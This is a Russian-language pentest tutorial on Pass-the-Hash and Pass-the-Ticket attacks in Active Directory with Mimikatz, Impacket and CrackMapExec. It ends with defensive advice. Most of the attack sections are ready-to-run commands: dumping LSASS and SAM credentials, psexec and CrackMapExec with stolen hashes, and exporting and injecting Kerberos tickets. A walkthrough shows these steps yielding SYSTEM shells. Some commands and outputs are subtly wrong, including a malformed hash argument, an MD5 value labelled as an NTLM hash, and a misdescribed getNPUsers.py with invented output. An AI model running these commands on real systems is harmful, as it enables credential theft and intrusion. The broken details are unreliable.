# Реализации Pass-the-Hash и Pass-the-Ticket: Mimikatz, Impacket, CrackMapExec

## Контекст и базовые понятия: Архитектура аутентификации и векторы атак

Pass-the-Hash (PtH) и Pass-the-Ticket (PtT) представляют собой техники горизонтального перемещения (lateral movement), эксплуатирующие архитектурные особенности протоколов аутентификации Windows. Понимание этих атак требует четкого разграничения механизмов NTLM и Kerberos, так как они лежат в основе соответствующих векторов.

**Pass-the-Hash (PtH)** эксплуатирует протокол NTLM (NT LAN Manager). В классической модели NTLM аутентификация происходит по принципу «challenge-response». Клиент получает от сервера случайное число (challenge), шифрует им хеш пароля пользователя (NTLM-хеш) и отправляет ответ обратно. Сервер проверяет ответ, сверяя его со своим хранящимся хешем. Уязвимость заключается в том, что для успешной аутентификации не требуется знание самого пароля в открытом виде — достаточно передать захваченный ответ (или сам хеш, в зависимости от реализации клиента/сервера и версии протокола). Таким образом, NTLM-хеш становится полным эквивалентом пароля.

**Pass-the-Ticket (PtT)** эксплуатирует протокол Kerberos. В среде Active Directory (AD) аутентификация базируется на билетах. Пользователь получает Ticket Granting Ticket (TGT) от Key Distribution Center (KDC). Для доступа к ресурсу (например, файловой шаре) пользователь запрашивает Service Ticket (ST) у KDC, используя TGT. Если злоумышленник захватывает TGT или ST из памяти процесса LSASS (Local Security Authority Subsystem Service), он может внедрить этот билет в свою сессию и аутентифицироваться как легитимный пользователь, минуя проверку пароля или хеша.

Ключевое различие между атаками заключается в протоколе и следах в логах. PtH оставляет следы в событиях NTLM (Event ID 4624 с типом логина 3 или 10), тогда как PtT имитирует легитимный Kerberos-трафик (Event ID 4768 для TGT, 4769 для ST), что делает его более скрытным, но требует наличия валидных билетов.

| Характеристика | Pass-the-Hash (PtH) | Pass-the-Ticket (PtT) |
| :--- | :--- | :--- |
| **Эксплуатируемый протокол** | NTLM (чаще всего) | Kerberos |
| **Объект атаки** | NTLM-хеш (128-битный) | TGT (Ticket Granting Ticket) или ST (Service Ticket) |
| **Механизм внедрения** | Передача хеша в поле ответа протокола | Внедрение билета в память процесса (LSASS) или кэш |
| **Требования к среде** | Поддержка NTLM на целевой системе (часто отключена в новых версиях) | Наличие валидного TGT/ST в памяти жертвы |
| **Скрытность** | Средняя (вызывает подозрительные NTLM-события) | Высокая (выглядит как легитимный Kerberos-трафик) |
| **Время жизни** | До смены пароля пользователя | До истечения срока действия билета (обычно 10 часов для TGT) |
| **Основные инструменты** | Mimikatz, Impacket, CrackMapExec | Mimikatz, Rubeus, Impacket (ticketConverter) |

Разграничение также важно для понимания происхождения материала. Хеши извлекаются из SAM (локальные пользователи) или LSASS (активные сессии). Билеты извлекаются исключительно из LSASS, так как Kerberos-клиент хранит их там для быстрого доступа.

## Внутреннее устройство: Архитектура инструментов и протоколов

Для реализации PtH и PtT на практике используются три основных класса инструментов: специализированные утилиты для работы с памятью и билетами (Mimikatz), набор скриптов на Python для работы с сетевыми протоколами (Impacket) и фреймворки для автоматизации атак (CrackMapExec/NetExec).

### Mimikatz: Работа с памятью и билетами
Mimikatz — это утилита для извлечения учетных данных из памяти Windows. Она работает на уровне API Windows, обращаясь к процессу `lsass.exe`.
*   **Механизм извлечения:** Mimikatz использует функцию `ReadProcessMemory` для чтения памяти LSASS. Для этого требуется привилегия `SeDebugPrivilege`.
*   **Модули:**
    *   `sekurlsa::logonpasswords`: Извлекает plaintext-пароли и хеши для активных сессий.
    *   `lsadump::sam`: Извлекает хеши из локальной базы SAM (требует доступа к файлу или дампу).
    *   `kerberos::list`: Выводит список текущих билетов в памяти.
    *   `kerberos::ptt`: Внедряет билет `.kirbi` в текущую сессию.
    *   `privilege::debug`: Активирует отладочные права, необходимые для чтения памяти LSASS.

### Impacket: Сетевая реализация протоколов
Impacket — это набор классов Python для работы с сетевыми протоколами. Он не работает с памятью напрямую, а формирует сетевые пакеты, имитирующие легитимный клиент.
*   **Архитектура:** Каждый инструмент (psexec.py, smbclient.py, secretsdump.py) является оберткой над классами протоколов SMB, MS-RPC, Kerberos.
*   **Реализация PtH:** Скрипты Impacket принимают хеш в формате `LM:NT` или только `NT`. Они передают этот хеш в поле `Authenticator` или `Response` протокола NTLM.
*   **Реализация PtT:** Impacket использует библиотеку `impacket.krb5` для парсинга билетов `.kirbi` (формат Base64, ASN.1) и конвертации их в `.ccache` (формат CCache) для использования в Unix-среде или через переменные окружения `KRB5CCNAME`.

### CrackMapExec (CME): Оркестрация и автоматизация
CrackMapExec (ныне форкнутый в NetExec) — это инструмент пост-эксплуатации, который объединяет возможности Impacket и другие модули.
*   **Принцип работы:** CME сканирует сеть, проверяет доступность SMB-портов (445), а затем применяет аутентификацию (пароль, хеш, билет) к каждому хосту.
*   **Модульность:** Поддерживает выполнение произвольных Python-скриптов (модулей) на целевой системе или локально для обработки результатов.
*   **Интеграция:** Может использовать результаты других инструментов (например, дампы LSASS) как входные данные для автоматического перебора хешей по сети.

| Инструмент | Основная функция | Уровень работы | Формат данных |
| :--- | :--- | :--- | :--- |
| **Mimikatz** | Извлечение и внедрение | Локальная память (LSASS) | `.kirbi` (билеты), HEX (хеши) |
| **Impacket** | Сетевая аутентификация | Сетевой протокол (SMB/Kerberos) | `LM:NT` (хеши), `.ccache` (билеты) |
| **CrackMapExec** | Сканирование и оркестрация | Сеть + Локальная память | Хеш/Пароль/Билет в аргументах CLI |

## Применение и работа с предметом: Практические сценарии и команды

Реализация атак требует последовательного выполнения этапов: извлечение материала, подготовка среды и выполнение аутентификации.

### Извлечение NTLM-хешей
Для PtH необходим NTLM-хеш. Он может быть извлечен из LSASS (активные сессии) или из SAM (локальные пользователи).

**Использование Mimikatz для извлечения хешей из LSASS:**
```powershell
# Активация прав отладчика
privilege::debug

# Извлечение всех учетных данных
sekurlsa::logonpasswords

# В выводе ищем поле "ntlm" для нужного пользователя
```

**Использование Impacket secretsdump.py для извлечения SAM/LSA:**
```bash
# Извлечение SAM и LSA secrets с удаленного хоста
python3 secretsdump.py domain/user:password@target_ip

# Извлечение только SAM (локальные хеши)
python3 secretsdump.py domain/user:password@target_ip -sam

# Извлечение только LSA secrets
python3 secretsdump.py domain/user:password@target_ip -lsa
```

### Выполнение Pass-the-Hash

**С помощью Impacket psexec.py:**
```bash
# Синтаксис: -hashes LM:NT
# Если LM-хеш пуст, используется только NT (начинается с двоеточия)
python3 psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c domain/administrator@target_ip

# Ожидаемый результат: Командная оболочка SYSTEM на целевой машине
```

**С помощью CrackMapExec:**
```bash
# Проверка доступа и выполнение команды
crackmapexec smb target_ip -u administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c -x "whoami"

# Сканирование сети с использованием хеша
crackmapexec smb 192.168.1.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

### Выполнение Pass-the-Ticket

**Извлечение и экспорт билетов Mimikatz:**
```powershell
# Экспорт всех билетов в текущую директорию
kerberos::list /export

# Внедрение конкретного билета
kerberos::ptt ticket.kirbi
```

**Конвертация билета для Unix/Impacket:**
```bash
# Конвертация .kirbi в .ccache
python3 ticketConverter.py ticket.kirbi ticket.ccache

# Установка переменной окружения для использования билета
export KRB5CCNAME=ticket.ccache

# Использование билета в Impacket (флаг -k указывает на использование кэша)
python3 psexec.py -k domain/user@target_ip
```

### Типичные ошибки и подводные камни
1.  **Формат хеша:** Impacket требует формат `LM:NT`. Если LM-хеш не известен, используется заглушка `aad3b435b51404eeaad3b435b51404ee` (пустой LM-хеш).
2.  **Совместимость NTLM:** В Windows 10/11 и Server 2016+ NTLMv2 является стандартом. PtH через NTLMv2 работает, но некоторые старые службы могут требовать NTLMv1, что делает атаку невозможной без ретрансляции (NTLM Relay).
3.  **Срок жизни билета:** TGT имеет ограниченный срок жизни (по умолчанию 10 часов). После истечения билет становится недействительным, и атака требует повторного извлечения.
4.  **Service Principal Name (SPN):** При использовании PtT с Impacket важно учитывать, что некоторые скрипты могут пытаться изменить SPN для обхода ограничений, что может вызвать ошибки аутентификации.

## Сквозной практический пример: Горизонтальное перемещение через PtH и PtT

**Исходные условия:**
*   **Среда:** Active Directory домен `CORP.LOCAL`.
*   **Роль:** Пентестер, имеющий доступ к рабочей станции `WORKSTATION01` с правами локального администратора.
*   **Цель:** Получить доступ к файловому серверу `FILESRV01` и извлечь данные, используя учетные данные доменного администратора, захваченные с другой машины.
*   **Инструменты:** Mimikatz (на локальной машине), Impacket (на атакующей машине Kali Linux).

### Шаг 1: Извлечение NTLM-хеша доменного администратора с рабочей станции

Атакующий использует Mimikatz на скомпрометированной машине, где ранее входил доменный администратор, чтобы извлечь его NTLM-хеш.

```powershell
# Выполнение в PowerShell от имени SYSTEM
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# Анализ вывода:
# Username : admin
# Domain   : CORP
# NTLM     : 5f4dcc3b5aa765d61d8327deb882cf99
```

*Ожидаемый результат:* Получен NTLM-хеш `5f4dcc3b5aa765d61d8327deb882cf99` для пользователя `admin`.

### Шаг 2: Проверка доступа к файловому серверу через PtH с помощью Impacket

Атакующий использует скрипт `smbclient.py` из Impacket для проверки доступа к файловой шаре на `FILESRV01` с использованием захваченного хеша.

```bash
# Использование хеша для подключения к SMB
python3 smbclient.py -hashes :5f4dcc3b5aa765d61d8327deb882cf99 CORP/admin@FILESRV01

# Вывод:
# Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
# [*] Connecting to smb://FILESRV01:445/
# [+] authenticated CORP/admin
# smb: \>
```

*Ожидаемый результат:* Успешная аутентификация и доступ к командной оболочке SMB. Это подтверждает, что PtH работает и NTLM-аутентификация разрешена.

### Шаг 3: Выполнение команды на файловом сервере через PtH

Для получения более широкого доступа атакующий использует `psexec.py` для запуска командной оболочки на `FILESRV01`.

```bash
python3 psexec.py -hashes :5f4dcc3b5aa765d61d8327deb882cf99 CORP/admin@FILESRV01

# Вывод:
# [+] authenticated CORP/admin
# [+] Service 'PSEXESVC' started
# [+] Service 'PSEXESVC' stopped
# [+] Got system prompt
# SYSTEM@FILESRV01 C:\Windows\system32>
```

*Ожидаемый результат:* Получена оболочка с правами SYSTEM на файловом сервере.

### Шаг 4: Извлечение Kerberos-билета для PtT (опционально для скрытности)

Для дальнейшего перемещения без использования NTLM (чтобы избежать детекции по NTLM-событиям) атакующий извлекает TGT администратора.

```powershell
# На машине с доступом к LSASS администратора
mimikatz.exe "privilege::debug" "kerberos::list /export" exit

# Файл ticket.kirbi сохранен в текущей директории
```

### Шаг 5: Использование PtT для доступа к другому ресурсу

Атакующий конвертирует билет и использует его для доступа к LDAP-серверу (DC) для сбора информации.

```bash
# Конвертация билета
python3 ticketConverter.py ticket.kirbi ticket.ccache

# Установка переменной окружения
export KRB5CCNAME=ticket.ccache

# Использование с Impacket для запроса LDAP
python3 getNPUsers.py -k -dc-ip 192.168.1.10 CORP/ -request

# Вывод:
# [*] Getting TGT for admin
# [+] TGT successfully retrieved
```

*Ожидаемый результат:* Успешное использование билета для аутентификации в Kerberos-среде без передачи хеша.

**Ожидаемый вывод примера:**
Пример демонстрирует полный цикл горизонтального перемещения: от извлечения хеша до его использования для доступа к ресурсам и последующего перехода к более скрытному методу (PtT). Это показывает, как инструменты Mimikatz и Impacket дополняют друг друга в рамках одной атаки.

## Аналитический вывод

Pass-the-Hash и Pass-the-Ticket остаются критически важными техниками в арсенале пентестеров и злоумышленников из-за их способности обходить традиционные средства защиты, основанные на паролях. Mimikatz обеспечивает прямой доступ к материалам аутентификации из памяти, Impacket предоставляет гибкие средства сетевой аутентификации, а CrackMapExec автоматизирует процесс масштабирования атаки. Защита от этих атак требует комплексного подхода: отключения NTLM там, где это возможно, использования Credential Guard для защиты LSASS, ограничения срока жизни билетов Kerberos и мониторинга аномальных событий аутентификации (например, необычных типов логина или запросов билетов). Понимание внутренних механизмов этих инструментов позволяет не только проводить эффективное тестирование на проникновение, но и разрабатывать более точные правила детекции.

## Источники

1.  [Pass-the-? | My Penetration Test Guide](https://reaper.gitbook.io/my-penetration-test-guide/guide/active-directory/lateral-movement/pass-the)
2.  [Active Directory Attacks: Pass-the-Hash, Pass-the-Ticket & Qualys](https://blog.qualys.com/product-tech/2026/02/11/qualys-etm-detect-pass-the-hash-pass-the-ticket-attacks)
3.  [AD Attack Lab Part Four (Pass The Hash, Token Impersonation, Kerberoasting, Mimikatz, and Golden Ticket attacks)](https://bohansec.com/2020/11/01/AD-Attack-Part-4/)
4.  [Pass-the-Hash & Pass-the-Ticket: How Attackers Move Laterally](https://hivesecurity.gitlab.io/blog/pass-the-hash-pass-the-ticket-attack-and-detect/)
5.  [Pass-the-Ticket Attack Explained: Risks, Examples & Defense Strategies](https://netwrix.com/en/cybersecurity-glossary/cyber-security-attacks/pass-the-ticket-attack/)
6.  [What are Pass-the-Hash (PtH) & Pass-the-Ticket (PtT)?](https://www.sentinelone.com/cybersecurity-101/threat-intelligence/what-are-pass-the-hash-pth-pass-the-ticket-ptt/)
7.  [Pass the ticket | The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/ptt)
8.  [Pass the hash - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ntlm/pth)
9.  [A Comprehensive Guide to Pass-the-Hash Attacks](https://fidelissecurity.com/cybersecurity-101/cyberattacks/pass-the-hash-attacks/)
10. [The-Hacker-Recipes/active-directory-domain-services/movement/abusing-kerberos/pass-the-ticket.md](https://github.com/Hackndo/The-Hacker-Recipes/blob/master/active-directory-domain-services/movement/abusing-kerberos/pass-the-ticket.md)
11. [Mimikatz | Hackviser](https://hackviser.com/tactics/tools/mimikatz)
12. [Breaking Active Directory — CrackMapExec to Pass-the-Hash](https://medium.com/@hariharanss/breaking-active-directory-crackmapexec-to-pass-the-hash-exploring-ad-attack-techniques-66dd4e35fa1c)